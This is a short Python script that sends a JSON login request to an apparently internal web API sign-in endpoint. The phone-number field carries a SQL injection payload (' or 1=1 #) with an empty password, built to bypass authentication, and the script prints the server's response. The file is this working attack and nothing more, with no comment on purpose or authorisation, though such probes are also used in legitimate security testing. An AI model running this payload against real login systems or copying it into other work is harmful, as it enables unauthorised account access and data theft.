# -*- coding:utf-8 -*-
import requests


headers = {"Content-Type": "application/json"}
userinfo = {
    "PhoneNumber": "13338053699' or 1=1 #",
    "Password": ""
}
url = "http://192.168.0.241:3005/api/Account/SignIn"
response = requests.post(url, json=userinfo, headers=headers)
print(response.text)